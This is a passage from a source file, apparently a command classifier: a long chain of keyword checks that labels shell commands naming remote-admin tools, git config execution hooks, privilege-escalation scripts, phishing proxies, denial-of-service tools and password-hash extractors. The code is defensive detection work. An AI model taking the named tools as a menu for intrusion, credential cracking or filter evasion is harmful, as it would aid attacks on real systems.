             (ci_contains(text, "selenium") &&
              (ci_contains(text, " -") || ci_contains(text, " --") ||
               ci_contains(text, " hub") || ci_contains(text, " standalone") ||
               ci_contains(text, " node"))) ||
             ci_contains(text, "keytool") || ci_contains(text, "jarsigner") ||
             ci_contains(text, "gitsign") || ci_contains(text, "rekor-cli") ||
             ci_contains(text, "fulcio") || ci_contains(text, "productsign") ||
             ci_contains(text, "pkgbuild") || ci_contains(text, "productbuild") ||
             ci_contains(text, "notarytool") || ci_contains(text, "altool") ||
             (ci_contains(text, "stapler") &&
              (ci_contains(text, " staple ") || ci_contains(text, " -"))) ||
             (ci_contains(text, "electron-") &&
              (ci_contains(text, "packager") || ci_contains(text, "builder"))) ||
             (ci_contains(text, "security") &&
              (ci_contains(text, " add-") || ci_contains(text, " import") ||
               ci_contains(text, " delete-") || ci_contains(text, " find-") ||
               ci_contains(text, " set-") || ci_contains(text, " export") ||
               ci_contains(text, " cms") || ci_contains(text, " create-") ||
               ci_contains(text, " unlock") || ci_contains(text, " authoriz"))) ||
             (ci_contains(text, "defaults") &&
              (ci_contains(text, " write") || ci_contains(text, " delete") ||
               ci_contains(text, " import") || ci_contains(text, " export") ||
               ci_contains(text, " rename"))) ||
             (ci_contains(text, "hdiutil") &&
              (ci_contains(text, " attach") || ci_contains(text, " create") ||
               ci_contains(text, " detach") || ci_contains(text, " burn") ||
               ci_contains(text, " compact") || ci_contains(text, " convert") ||
               ci_contains(text, " chpass") || ci_contains(text, " resize") ||
               ci_contains(text, " -srcfolder") || ci_contains(text, " mount"))) ||
             ci_contains(text, "system_profiler") ||
             (ci_contains(text, "codesign") &&
              (ci_contains(text, " --sign") || ci_contains(text, " -s") ||
               ci_contains(text, " --remove") || ci_contains(text, " --deep") ||
               ci_contains(text, " --entitlements"))) ||
             ci_contains(text, "mount_afp") || ci_contains(text, "mount_webdav") ||
             (ci_contains(text, "airport") &&
              (ci_contains(text, " -s") || ci_contains(text, " sniff") ||
               ci_contains(text, " --"))) ||
             (ci_contains(text, "open ") &&
              (ci_contains(text, " -a") || ci_contains(text, " -b") ||
               ci_contains(text, " -e") || ci_contains(text, " -F") ||
               ci_contains(text, " -R"))) ||
             (ci_contains(text, "sfltool") &&
              (ci_contains(text, " resetbtm") || ci_contains(text, " addbtm") ||
               ci_contains(text, " -"))) ||
             ci_contains(text, "kextunload") ||
             (ci_contains(text, "systemextensionsctl") &&
              (ci_contains(text, " uninstall") || ci_contains(text, " reset"))) ||
             ci_contains(text, "lsappinfo") || ci_contains(text, "syspolicyd")) {
        what = "macos/jail/build/signing/java/misc-exec primitive";
        }
        else if (ci_contains(text, "dwagsvc") || ci_contains(text, "meshcentral") ||
             ci_contains(text, "meshagent") || ci_contains(text, "level.io") ||
             ci_contains(text, "radmin") || ci_contains(text, "intelliadmin") ||
             ci_contains(text, "remcom") || ci_contains(text, "winexesvc") ||
             ci_contains(text, "zohoassist") || ci_contains(text, "winvnc") ||
             ci_contains(text, "tvnserver") || ci_contains(text, "vncviewer") ||
             ci_contains(text, "tightvnc") || ci_contains(text, "ultravnc") ||
             ci_contains(text, "realvnc") || ci_contains(text, "anyvnc") ||
             (ci_contains(text, "parsec") &&
              (ci_contains(text, " -") || ci_contains(text, " --") ||
               ci_contains(text, " daemon") || ci_contains(text, " host"))) ||
             (ci_contains(text, "vnc") &&
              (ci_contains(text, " -") || ci_contains(text, " --") ||
               ci_contains(text, " :"))) ||
             ci_contains(text, "secedit") || ci_contains(text, "tracelog") ||
             (ci_contains(text, "typeperf") &&
              (ci_contains(text, " -") || ci_contains(text, " /"))) || (ci_contains(text, "ksetup") && !ci_contains(text, "networksetup")) ||
             ci_contains(text, "ktpass") || ci_contains(text, "setspn") ||
             ci_contains(text, "dsget") || ci_contains(text, "dsmove") ||
             ci_contains(text, "ldp.exe") || ci_contains(text, "vaultcmd") ||
             ci_contains(text, "rasautou") || ci_contains(text, "tscon") ||
             ci_contains(text, "quser") || ci_contains(text, "qprocess") ||
             ci_contains(text, "query session") || ci_contains(text, "query user") ||
             (ci_contains(text, "shadow ") &&
              (ci_contains(text, " /dest") || ci_contains(text, " -") ||
               ci_contains(text, " /"))) ||
             (ci_contains(text, "msg") &&
              (ci_contains(text, " *") || ci_contains(text, " /server") ||
               ci_contains(text, " /v"))) ||
             ci_contains(text, "change logon") || ci_contains(text, "chglogon") ||
             ci_contains(text, "chgusr") ||
             (ci_contains(text, "wevtutil") &&
              (ci_contains(text, " epl") || ci_contains(text, " export"))) ||
             (ci_contains(text, "powercfg") &&
              (ci_contains(text, " /h") || ci_contains(text, " /waketimers") ||
               ci_contains(text, " /battery") || ci_contains(text, " /energy") ||
               ci_contains(text, " -"))) ||
             (ci_contains(text, "netstat") &&
              (ci_contains(text, " -b") || ci_contains(text, " -f"))) ||
             (ci_contains(text, "netsh wlan") &&
              (ci_contains(text, " export") || ci_contains(text, " add ") ||
               ci_contains(text, " delete") || ci_contains(text, " set ") ||
               ci_contains(text, " disconnect") ||
               ci_contains(text, " hostednetwork"))) ||
             ci_contains(text, "netsh winhttp") ||
             (ci_contains(text, "attrib ") &&
              (ci_contains(text, " +") || ci_contains(text, " -") ||
               ci_contains(text, " /"))) ||
             (ci_contains(text, "compact") &&
              (ci_contains(text, " /c") || ci_contains(text, " /u") ||
               ci_contains(text, " /i"))) ||
             (ci_contains(text, "format") &&
              (ci_contains(text, " c:") || ci_contains(text, " d:") ||
               ci_contains(text, " /q") || ci_contains(text, " /fs") ||
               ci_contains(text, " /v"))) ||
             (ci_contains(text, "mountvol") &&
              (ci_contains(text, " /d") || ci_contains(text, " /r") ||
               ci_contains(text, " -"))) ||
             (ci_contains(text, "chkdsk") &&
              (ci_contains(text, " /") || ci_contains(text, " -") ||
               ci_contains(text, " c:") || ci_contains(text, " d:"))) ||
             ci_contains(text, "efibootmgr") ||
             ci_contains(text, "efivar") || ci_contains(text, "fwupdmgr") ||
             ci_contains(text, "fwupdtool") || ci_contains(text, "fwupd") ||
             ci_contains(text, "kernel-install") || ci_contains(text, "devmem") ||
             ci_contains(text, "memtool") || ci_contains(text, "i2cget") ||
             ci_contains(text, "i2cdetect") || ci_contains(text, "i2cdump") ||
             ci_contains(text, "gpiodetect") || ci_contains(text, "gpioinfo") ||
             ci_contains(text, "gpioget") || ci_contains(text, "gpiomon") ||
             ci_contains(text, "kpartx") || ci_contains(text, "partprobe") ||
             ci_contains(text, "fakechroot") ||
             ci_contains(text, "fakeroot") || ci_contains(text, "pwconv") ||
             ci_contains(text, "grpconv") || ci_contains(text, "chage") ||
             ci_contains(text, "lastlog") || ci_contains(text, "hostnamectl") ||
             ci_contains(text, "domainname") || ci_contains(text, "ypdomainname") ||
             ci_contains(text, "nisdomainname") || ci_contains(text, "netcap") ||
             ci_contains(text, "audicap") ||
             (ci_contains(text, "setcap") &&
              (ci_contains(text, " cap") || ci_contains(text, " -"))) ||
             (ci_contains(text, "logger") &&
              (ci_contains(text, " -") || ci_contains(text, " --"))) ||
             ci_contains(text, "kbld") || ci_contains(text, "imgpkg") ||
             (ci_contains(text, "ytt") &&
              (ci_contains(text, " -") || ci_contains(text, " --"))) ||
             ci_contains(text, "vendir") ||
             (ci_contains(text, "cdk") &&
              (ci_contains(text, " deploy") || ci_contains(text, " destroy") ||
               ci_contains(text, " synth") || ci_contains(text, " bootstrap"))) ||
             (ci_contains(text, "firebase") &&
              (ci_contains(text, " deploy") || ci_contains(text, " functions:") ||
               ci_contains(text, " database:") || ci_contains(text, " firestore:") ||
               ci_contains(text, " auth:") || ci_contains(text, " hosting") ||
               ci_contains(text, " -"))) ||
             (ci_contains(text, "wrangler") &&
              (ci_contains(text, " deploy") || ci_contains(text, " kv") ||
               ci_contains(text, " r2") || ci_contains(text, " d1") ||
               ci_contains(text, " pages") || ci_contains(text, " publish") ||
               ci_contains(text, " -"))) ||
             ci_contains(text, "dokku") || ci_contains(text, "caprover") ||
             (ci_contains(text, "sst") &&
              (ci_contains(text, " deploy") || ci_contains(text, " remove") ||
               ci_contains(text, " dev") || ci_contains(text, " console"))) ||
             (ci_contains(text, "smithy") &&
              (ci_contains(text, " build") || ci_contains(text, " codegen") ||
               ci_contains(text, " -") || ci_contains(text, " --"))) ||
             ci_contains(text, "enum4linux") || ci_contains(text, "snaffler") ||
             ci_contains(text, "certipy") || ci_contains(text, "rubeus") ||
             ci_contains(text, "kekeo") || ci_contains(text, "mitmproxy") ||
             ci_contains(text, "mitmdump") || ci_contains(text, "mitmweb") ||
             ci_contains(text, "sslsplit") || ci_contains(text, "sslstrip") ||
             ci_contains(text, "sslscan") || ci_contains(text, "sslyze") ||
             ci_contains(text, "testssl") || ci_contains(text, "tlssled") ||
             ci_contains(text, "subjack") || ci_contains(text, "subzy") ||
             ci_contains(text, "subover") || ci_contains(text, "tko-subs") ||
             ci_contains(text, "cloudenum") || ci_contains(text, "cloudmapper") ||
             ci_contains(text, "cloudsplaining") ||
             ci_contains(text, "gophish") || ci_contains(text, "evilginx") ||
             ci_contains(text, "modlishka") || ci_contains(text, "muraena") ||
             ci_contains(text, "setoolkit") || ci_contains(text, "wifiphisher") ||
             ci_contains(text, "airgeddon") || ci_contains(text, "ropgadget") ||
             ci_contains(text, "ropper") || ci_contains(text, "rop-cli") ||
             ci_contains(text, "one_gadget") || ci_contains(text, "pwntools") ||
             ci_contains(text, "checksec") || ci_contains(text, "trivy") ||
             ci_contains(text, "checkov") || ci_contains(text, "terrascan") ||
             ci_contains(text, "kube-bench") ||
             ci_contains(text, "kubebench") || ci_contains(text, "grype") || ci_contains(text, "syft") ||
             ci_contains(text, "osv-scanner") || ci_contains(text, "semgrep") ||
             (ci_contains(text, "bandit") &&
              (ci_contains(text, " -") || ci_contains(text, " --") ||
               ci_contains(text, ".py"))) ||
             (ci_contains(text, "kics") &&
              (ci_contains(text, " scan") || ci_contains(text, " -") ||
               ci_contains(text, " --"))) ||
             (ci_contains(text, "proot") &&
              (ci_contains(text, " -") || ci_contains(text, " /root") ||
               ci_contains(text, " .") || ci_contains(text, " -b")))) {
        what = "rmm/policy/netrecon/cloud-primitive";
        }
        else if (ci_contains(text, "core.sshcommand") ||
             ci_contains(text, "core.fsmonitor") ||
             ci_contains(text, "gpg.program") ||
             ci_contains(text, "diff.external") ||
             ci_contains(text, "difffilter") ||
             ci_contains(text, "insteadof") ||
             ci_contains(text, "sendemail.smtp") ||
             (ci_contains(text, " merge.") &&
              ci_contains(text, ".driver")) ||
             (ci_contains(text, " filter.") &&
              (ci_contains(text, ".clean") || ci_contains(text, ".smudge") ||
               ci_contains(text, ".required"))) ||
             ci_contains(text, "git daemon") || ci_contains(text, "instaweb") ||
             (ci_contains(text, "bisect") &&
              (ci_contains(text, " run ") || ci_contains(text, " exec"))) ||
             ci_contains(text, "remote-hg") || ci_contains(text, "remote-bzr") ||
             ci_contains(text, "git svn") || ci_contains(text, "svnserve") ||
             ci_contains(text, "svnsync") ||
             (ci_contains(text, "hg ") &&
              (ci_contains(text, " serve") || ci_contains(text, " -R "))) ||
             (ci_contains(text, "watchman") &&
              (ci_contains(text, " watch ") || ci_contains(text, " trigger ") ||
               ci_contains(text, " --")) &&
              !ci_contains(text, "--version") &&
              !ci_contains(text, "--help")) ||
             (ci_contains(text, "nodemon") &&
              (ci_contains(text, " -") || ci_contains(text, " --") ||
               ci_contains(text, ".js")) &&
              !ci_contains(text, "--version") &&
              !ci_contains(text, "--help")) ||
             ci_contains(text, "chokidar") || ci_contains(text, "cargo-watch") ||
             (ci_contains(text, "entr") &&
              (ci_contains(text, " -") || ci_contains(text, " /") ||
               ci_contains(text, " ."))) ||
             (ci_contains(text, "reflex") &&
              (ci_contains(text, " -") || ci_contains(text, " --"))) ||
             (ci_contains(text, "air ") &&
              (ci_contains(text, " -c") || ci_contains(text, " init") ||
               ci_contains(text, ".toml"))) ||
             (ci_contains(text, "gaze") &&
              (ci_contains(text, " -") || ci_contains(text, " --")) &&
              !ci_contains(text, "--version") &&
              !ci_contains(text, "--help")) ||
             (ci_contains(text, "node ") &&
              (ci_contains(text, " --eval") || ci_contains(text, " --inspect") ||
               ci_contains(text, " -p ") ||
               ci_contains(text, "--experimental"))) ||
             (ci_contains(text, "deno") &&
              (ci_contains(text, " eval") || ci_contains(text, " install") ||
               ci_contains(text, " task") || ci_contains(text, " compile") ||
               ci_contains(text, " run -a") || ci_contains(text, " run --allow"))) ||
             (ci_contains(text, "bun ") &&
              (ci_contains(text, ".js") || ci_contains(text, ".ts") ||
               ci_contains(text, " -e") || ci_contains(text, " --eval"))) ||
             (ci_contains(text, "pear") &&
              (ci_contains(text, " install") || ci_contains(text, " channel") ||
               ci_contains(text, " -"))) ||
             ci_contains(text, "impdp") ||
             (ci_contains(text, "mokutil") &&
              (ci_contains(text, " --disable") || ci_contains(text, " --import") ||
               ci_contains(text, " --delete") || ci_contains(text, " --reset") ||
               ci_contains(text, " --mokx") || ci_contains(text, " --timeout"))) ||
             ci_contains(text, "efi-updatevar") || ci_contains(text, "ykpersonalize") ||
             ci_contains(text, "nitrocli") || ci_contains(text, "onlykey-cli") ||
             (ci_contains(text, "claymore") &&
              (ci_contains(text, " -e") || ci_contains(text, " --") ||
               ci_contains(text, " miner") || ci_contains(text, "pool"))) ||
             (ci_contains(text, "btrfs") &&
              (ci_contains(text, " filesystem resiz") ||
               ci_contains(text, " filesystem defr") ||
               ci_contains(text, " balance") || ci_contains(text, " device add") ||
               ci_contains(text, " device delete") || ci_contains(text, " scrub "))) ||
             (ci_contains(text, "winrs") &&
              ci_contains(text, " -")) ||
             ci_contains(text, "colorcpl") ||
             ci_contains(text, "optionalfeatures") || ci_contains(text, "syssetup") ||
             ci_contains(text, "dcomcnfg") ||
             (ci_contains(text, "mmc") &&
              ci_contains(text, ".msc")) ||
             (ci_contains(text, "strip") &&
              (ci_contains(text, " -") || ci_contains(text, " --"))) ||
             (ci_contains(text, "pmap") &&
              (ci_contains(text, " -") || ci_contains(text, " --"))) ||
             (ci_contains(text, "mt") &&
              (ci_contains(text, " -f") && (ci_contains(text, " erase") ||
               ci_contains(text, " retens")))) ||
             ci_contains(text, "mtx") ||
             (ci_contains(text, "dump") &&
              (ci_contains(text, " /dev/") || ci_contains(text, " -0") ||
               ci_contains(text, " -1"))) ||
             (ci_contains(text, "restore") &&
              (ci_contains(text, " -") || ci_contains(text, " /dev/") ||
               ci_contains(text, " rf ") || ci_contains(text, " tf "))) ||
             ci_contains(text, "amdump") || ci_contains(text, "amrestore") ||
             ci_contains(text, "amadmin") || ci_contains(text, "amtape") ||
             (ci_contains(text, "auditctl") &&
              (ci_contains(text, " -r") || ci_contains(text, " -e 0")))) {
        what = "git-config-exec/watch/js/firmware/snapshot/uac/elf primitive";
        }
        else if ((ci_contains(text, "dseditgroup") &&
              (ci_contains(text, " -o edit") || ci_contains(text, " -o add") ||
               ci_contains(text, " -o delete") || ci_contains(text, " -o create") ||
               ci_contains(text, " -a ") || ci_contains(text, " -d "))) || ci_contains(text, "dsenableroot") ||
             ci_contains(text, "socketfilterfw") || ci_contains(text, "santactl") ||
             ci_contains(text, "mdatp") || ci_contains(text, "falconctl") ||
             ci_contains(text, "sentinelctl") || ci_contains(text, "munkiimport") ||
             (ci_contains(text, "restorecon") &&
              !ci_contains(text, "restoreconfig")) ||
             (ci_contains(text, "runcon") &&
              !ci_contains(text, "runcontext")) ||
             ci_contains(text, "mpiexec") || ci_contains(text, "mpirun") ||
             ci_contains(text, "orterun") ||
             (ci_contains(text, "orted") && !ci_contains(text, "sorted")) ||
             ci_contains(text, "ompi-") || ci_contains(text, "oshrun") ||
             ci_contains(text, "shmemrun") || ci_contains(text, "hydra_pmi") ||
             ci_contains(text, "mpicc") || ci_contains(text, "mpicxx") ||
             ci_contains(text, "mpif77") || ci_contains(text, "mpif90") ||
             ci_contains(text, "mpifort") || ci_contains(text, "mpdboot") ||
             ci_contains(text, "mpdallexit") || ci_contains(text, "srun") ||
             ci_contains(text, "sbatch") || ci_contains(text, "salloc") ||
             ci_contains(text, "scancel") || ci_contains(text, "scontrol") ||
             ci_contains(text, "squeue") ||
             (ci_contains(text, "sinfo") && ci_contains(text, " -")) ||
             ci_contains(text, "sacct") ||
             (ci_contains(text, "sreport") && ci_contains(text, " -")) ||
             ci_contains(text, "sdiag") || ci_contains(text, "qsub") ||
             ci_contains(text, "qdel") || ci_contains(text, "qstat") ||
             ci_contains(text, "qalter") || ci_contains(text, "qhold") ||
             ci_contains(text, "qrls") || ci_contains(text, "qmgr") ||
             ci_contains(text, "qselect") || ci_contains(text, "qmove") ||
             ci_contains(text, "pbsnodes") || ci_contains(text, "tracejob") ||
             ci_contains(text, "pbs_") || ci_contains(text, "bsub") ||
             ci_contains(text, "bjobs") || ci_contains(text, "bkill") ||
             (ci_contains(text, "bmod") &&
              !ci_contains(text, "submodule")) ||
             ci_contains(text, "brequeue") ||
             ci_contains(text, "bqueues") || ci_contains(text, "bhosts") ||
             (ci_contains(text, "badmin") &&
              !ci_contains(text, "wbadmin")) ||
             (ci_contains(text, "brun") && ci_contains(text, " -")) ||
             ci_contains(text, "lsload") || ci_contains(text, "lshosts") ||
             (ci_contains(text, "lsid") && ci_contains(text, " -")) ||
             ci_contains(text, "lsinfo") ||
             ci_contains(text, "condor_") ||
             (ci_contains(text, "genders") && ci_contains(text, " -")) ||
             ci_contains(text, "nodeattr") || ci_contains(text, "cluset") ||
             ci_contains(text, "clubak") || ci_contains(text, "powerman") ||
             ci_contains(text, "rconsole") || ci_contains(text, "conserver") ||
             (ci_contains(text, "conman") && ci_contains(text, " -")) ||
             ci_contains(text, "xcat") ||
             ci_contains(text, "rpower") || ci_contains(text, "rcons") ||
             ci_contains(text, "xdsh") || ci_contains(text, "xdcp") ||
             ci_contains(text, "tabdump") || ci_contains(text, "nodeset") ||
             ci_contains(text, "lsdef") || ci_contains(text, "mkdef") ||
             ci_contains(text, "nodestat") || ci_contains(text, "updatenode") ||
             ci_contains(text, "copycds") || ci_contains(text, "genimage") ||
             ci_contains(text, "makehosts") || ci_contains(text, "makedhcp") ||
             ci_contains(text, "sudokiller") || ci_contains(text, "suid3num") ||
             ci_contains(text, "winpwn") || ci_contains(text, "privesccheck") ||
             ci_contains(text, "linpeas") || ci_contains(text, "winpeas") ||
             (ci_contains(text, "linenum") &&
              !ci_contains(text, "linenumber")) ||
             (ci_contains(text, "traitor") && ci_contains(text, " -")) ||
             (ci_contains(text, "powerup") && ci_contains(text, " -")) ||
             (ci_contains(text, "watson") && ci_contains(text, " -")) ||
             (ci_contains(text, "seatbelt") && ci_contains(text, " -")) ||
             (ci_contains(text, "jaws") && ci_contains(text, " -")) ||
             ci_contains(text, "steghide") || ci_contains(text, "stegsnow") ||
             ci_contains(text, "outguess") || ci_contains(text, "openstego") ||
             ci_contains(text, "stegosuite") || ci_contains(text, "zsteg") ||
             ci_contains(text, "jphide") || ci_contains(text, "jsteg") ||
             (ci_contains(text, "snow") && ci_contains(text, " -")) ||
             (ci_contains(text, "f5") && ci_contains(text, " -e")) ||
             ci_contains(text, "sfill") || ci_contains(text, "sswap") ||
             ci_contains(text, "sdmem") || ci_contains(text, "nwipe") ||
             ci_contains(text, "bcwipe") || ci_contains(text, "dcfldd") ||
             ci_contains(text, "dc3dd") || ci_contains(text, "guymager") ||
             (ci_contains(text, "srm") && ci_contains(text, " -")) ||
             ci_contains(text, "slowloris") || ci_contains(text, "torshammer") ||
             ci_contains(text, "slowhttptest") || ci_contains(text, "pyloris") ||
             ci_contains(text, "ufonet") || ci_contains(text, "ddosim") ||
             ci_contains(text, "trinoo") || ci_contains(text, "stacheldraht") ||
             (ci_contains(text, "goldeneye") && ci_contains(text, " -")) ||
             (ci_contains(text, "hulk") && ci_contains(text, " -")) ||
             (ci_contains(text, "loic") && ci_contains(text, " -")) ||
             (ci_contains(text, "hoic") && ci_contains(text, " -")) ||
             (ci_contains(text, "xoic") && ci_contains(text, " -")) ||
             ci_contains(text, "mgen") || ci_contains(text, "nepim") ||
             ci_contains(text, "udpgen") || ci_contains(text, "bittwist") ||
             ci_contains(text, "fragroute") || ci_contains(text, "code-server") ||
             ci_contains(text, "openvscode") || ci_contains(text, "ollama") ||
             ci_contains(text, "vllm") || ci_contains(text, "localai") ||
             ci_contains(text, "llamafile") || ci_contains(text, "lmdeploy") ||
             ci_contains(text, "sglang") ||
             (ci_contains(text, "pass ") &&
              (ci_contains(text, " show") || ci_contains(text, " -c") ||
               ci_contains(text, " grep") || ci_contains(text, " insert") ||
               ci_contains(text, " rm ") || ci_contains(text, " generate") ||
               ci_contains(text, " otp") || ci_contains(text, " find"))) ||
             ci_contains(text, "gopass") || ci_contains(text, "kpcli") ||
             ci_contains(text, "keepassxc-") || ci_contains(text, "kwallet") ||
             ci_contains(text, "secret-tool") || ci_contains(text, "unshadow") ||
             ci_contains(text, "zip2john") || ci_contains(text, "rar2john") ||
             ci_contains(text, "pdf2john") || ci_contains(text, "ssh2john") ||
             ci_contains(text, "gpg2john") || ci_contains(text, "krb2john") ||
             ci_contains(text, "keepass2john") || ci_contains(text, "mozilla2john") ||
             ci_contains(text, "hccap2john") || ci_contains(text, "luks2john") ||
             ci_contains(text, "office2john") || ci_contains(text, "putty2john") ||
             ci_contains(text, "racf2john") || ci_contains(text, "bitcoin2john") ||
             ci_contains(text, "dmg2john") || ci_contains(text, "keychain2john") ||
             ci_contains(text, "keyring2john") || ci_contains(text, "kwallet2john") ||
             ci_contains(text, "wpapcap2john") || ci_contains(text, "1pass2john") ||
             ci_contains(text, "truecrypt_volume2john") ||
             ci_contains(text, "sipdump2john") ||
             (ci_contains(text, "wash") && ci_contains(text, " -i")) ||
             (ci_contains(text, "bully") && ci_contains(text, " -")) ||
             ci_contains(text, "pixiewps") || ci_contains(text, "mdk3") ||
             ci_contains(text, "mdk4") || ci_contains(text, "smqueue") ||
             ci_contains(text, "openbts") || ci_contains(text, "osmo-") ||
             ci_contains(text, "srsue") || ci_contains(text, "srsenb") ||
             ci_contains(text, "srsepc") || ci_contains(text, "srsnb") ||
             ci_contains(text, "srsdu") || ci_contains(text, "srsgnb") ||
             ci_contains(text, "srscu") || ci_contains(text, "open5gs") ||
             ci_contains(text, "bladerf") || ci_contains(text, "uhd_") ||
             ci_contains(text, "limeutil") || ci_contains(text, "gqrx") ||
             ci_contains(text, "gnuradio") || ci_contains(text, "volk_") ||
             (ci_contains(text, "transceiver") && ci_contains(text, " -")) ||
             (ci_contains(text, "yate") && ci_contains(text, " -")) ||
             (ci_contains(text, "named ") &&
              (ci_contains(text, " -") || ci_contains(text, ".conf"))) ||
             ci_contains(text, "named-check") || ci_contains(text, "named-compilezone") ||
             ci_contains(text, "named-journalprint") || ci_contains(text, "named-rrchecker") ||
             ci_contains(text, "nsd-control") || ci_contains(text, "nsd-check") ||
             ci_contains(text, "nsdc") || ci_contains(text, "pdnsutil") ||
             ci_contains(text, "rec_control") || ci_contains(text, "knotd") ||
             ci_contains(text, "knotc") || ci_contains(text, "kzonecheck") ||
             ci_contains(text, "dnssec-") || ci_contains(text, "tsig-keygen") ||
             ci_contains(text, "ddns-confgen") || ci_contains(text, "dnscache") ||
             ci_contains(text, "tinydns") || ci_contains(text, "axfr-get") ||
             ci_contains(text, "pickdns") || ci_contains(text, "walldns") ||
             ci_contains(text, "rbldns") || ci_contains(text, "axfrdns") ||
             ci_contains(text, "dnsfilter") || ci_contains(text, "dnsip") ||
             ci_contains(text, "dnsmx") ||
             (ci_contains(text, "dnsq") && !ci_contains(text, "dnsquery")) ||
             ci_contains(text, "dnstrace") || ci_contains(text, "dnstxt") ||
             ci_contains(text, "cli53") || ci_contains(text, "inadyn") ||
             ci_contains(text, "ddclient") || ci_contains(text, "ez-ipupdate") ||
             ci_contains(text, "dnscontrol") || ci_contains(text, "octodns") ||
             ci_contains(text, "maradns") || ci_contains(text, "deadwood") ||
             ci_contains(text, "zoneserver") || ci_contains(text, "askmara") ||
             ci_contains(text, "duende") || ci_contains(text, "fetchzone") ||
             ci_contains(text, "dnsviz") || ci_contains(text, "dnstop") ||
             ci_contains(text, "dnsbulk") || ci_contains(text, "calidns") ||
             ci_contains(text, "dnsscope") || ci_contains(text, "dnswasher") ||
             ci_contains(text, "nsec3dig") || ci_contains(text, "sdig") ||
             ci_contains(text, "stubquery") || ci_contains(text, "zone2json") ||
             ci_contains(text, "zone2sql") || ci_contains(text, "zone2ldap") ||
             ci_contains(text, "ngircd") || ci_contains(text, "inspircd") ||
             ci_contains(text, "unrealircd") || ci_contains(text, "ircd") ||
             ci_contains(text, "charybdis") ||
             ci_contains(text, "solanum") || ci_contains(text, "snircd") ||
             (ci_contains(text, "ergo") && ci_contains(text, " -")) ||
             ci_contains(text, "oragono") || ci_contains(text, "bitlbee") ||
             ci_contains(text, "anope") || ci_contains(text, "atheme") ||
             ci_contains(text, "nickserv") || ci_contains(text, "chanserv") ||
             ci_contains(text, "operserv") || ci_contains(text, "hostserv") ||
             ci_contains(text, "memoserv") || ci_contains(text, "botserv") ||
             ci_contains(text, "eggdrop") || ci_contains(text, "limnoria") ||
             ci_contains(text, "supybot") || ci_contains(text, "sopel") ||
             ci_contains(text, "errbot") || ci_contains(text, "hubbot") ||
             ci_contains(text, "znc") || ci_contains(text, "thelounge") ||
             ci_contains(text, "kiwiirc") || ci_contains(text, "convos") ||
             ci_contains(text, "soju") || ci_contains(text, "ejabberdctl") ||
             ci_contains(text, "prosodyctl") || ci_contains(text, "mongooseim") ||
             ci_contains(text, "jabberd") || ci_contains(text, "xmppd") ||
             ci_contains(text, "turnserver") || ci_contains(text, "turnadmin") ||
             ci_contains(text, "turnutils_") || ci_contains(text, "stund") ||
             ci_contains(text, "stunclient") ||
             (ci_contains(text, "stuntman") && ci_contains(text, " -")) ||
             ci_contains(text, "resiprocate") || ci_contains(text, "coturn") ||
             (ci_contains(text, "repro") && ci_contains(text, " -")) ||
             ci_contains(text, "opensmtpd") || ci_contains(text, "smtpctl") ||
             ci_contains(text, "msmtp") || ci_contains(text, "msmtpd") ||
             ci_contains(text, "getmail") || ci_contains(text, "fetchmail") ||
             ci_contains(text, "procmail") || ci_contains(text, "formail") ||
             ci_contains(text, "maildrop") || ci_contains(text, "deliverquota") ||
             ci_contains(text, "reformail") || ci_contains(text, "reformime") ||
             ci_contains(text, "makemime") || ci_contains(text, "mailbot") ||
             ci_contains(text, "sievec") || ci_contains(text, "sieved") ||
             ci_contains(text, "sieve-test") || ci_contains(text, "sieve-filter") ||
             ci_contains(text, "managesieve") || ci_contains(text, "pysieved") ||
             ci_contains(text, "himalaya") || ci_contains(text, "aerc") ||
             (ci_contains(text, "meli") && !ci_contains(text, "timeline")) || ci_contains(text, "mailutil") ||
             ci_contains(text, "tmail") ||
             (ci_contains(text, "dmail") && !ci_contains(text, "sendmail")) ||
             ci_contains(text, "ipop2d") || ci_contains(text, "ipop3d") ||
             ci_contains(text, "slocal") || ci_contains(text, "rcvstore") ||
             ci_contains(text, "rcvdist") || ci_contains(text, "rcvpack") ||
             ci_contains(text, "rcvtty") || ci_contains(text, "packf") ||
             ci_contains(text, "install-mh") || ci_contains(text, "msgchk") ||
             ci_contains(text, "mhmail") || ci_contains(text, "mhstore") ||
             ci_contains(text, "mhbuild") || ci_contains(text, "mhlogin") ||
             ci_contains(text, "mmh") || ci_contains(text, "mhl") ||
             ci_contains(text, "msh") || ci_contains(text, "nullmailer") ||
             ci_contains(text, "ssmtp") || ci_contains(text, "esmtp") ||
             ci_contains(text, "fdm") || ci_contains(text, "courierfilter") ||
             ci_contains(text, "courierlogger") || ci_contains(text, "courierperlfilter") ||
             ci_contains(text, "courieresmtpd") || ci_contains(text, "authtest") ||
             ci_contains(text, "authenumerate") || ci_contains(text, "authinfo") ||
             ci_contains(text, "authdaemond") || ci_contains(text, "makeuserdb") ||
             ci_contains(text, "userdb") || ci_contains(text, "userdbpw") ||
             ci_contains(text, "greylistd") || ci_contains(text, "postgrey") ||
             ci_contains(text, "policyd") || ci_contains(text, "sqlgrey") ||
             ci_contains(text, "milter-greylist") || ci_contains(text, "tumgreyspf") ||
             ci_contains(text, "opendkim") || ci_contains(text, "opendmarc") ||
             ci_contains(text, "arcsign") || ci_contains(text, "arcverify") ||
             ci_contains(text, "dkimproxy") || ci_contains(text, "dkimsign") ||
             ci_contains(text, "spfd") || ci_contains(text, "spfquery") ||
             ci_contains(text, "spfmilter") || ci_contains(text, "dspam") ||
             ci_contains(text, "razor-") || ci_contains(text, "dccproc") ||
             ci_contains(text, "dccifd") || ci_contains(text, "dccm") ||
             ci_contains(text, "dblist") || ci_contains(text, "dccd") ||
             ci_contains(text, "dccif") || ci_contains(text, "crm114") ||
             ci_contains(text, "cssutil") || ci_contains(text, "cssdiff") ||
             ci_contains(text, "cssmerge") || ci_contains(text, "mailmanctl") ||
             (ci_contains(text, "mailman") && ci_contains(text, " -")) ||
             (ci_contains(text, "newlist") &&
              !ci_contains(text, "newlisten")) ||
             (ci_contains(text, "rmlist") && !ci_contains(text, "termlist")) || ci_contains(text, "add_members") ||
             ci_contains(text, "remove_members") || ci_contains(text, "sync_members") ||
             ci_contains(text, "find_member") || ci_contains(text, "list_members") ||
             ci_contains(text, "list_lists") || ci_contains(text, "list_owners") ||
             ci_contains(text, "config_list") || ci_contains(text, "withlist") ||
             ci_contains(text, "mmsitepass") || ci_contains(text, "sympa") ||
             ci_contains(text, "ezmlm") || ci_contains(text, "majordomo") ||
             ci_contains(text, "cyradm") || ci_contains(text, "ctl_cyrusdb") ||
             ci_contains(text, "ctl_deliver") || ci_contains(text, "ctl_mboxlist") ||
             ci_contains(text, "cyr_dbtool") || ci_contains(text, "cyr_deny") ||
             ci_contains(text, "cyr_df") || ci_contains(text, "cyr_expire") ||
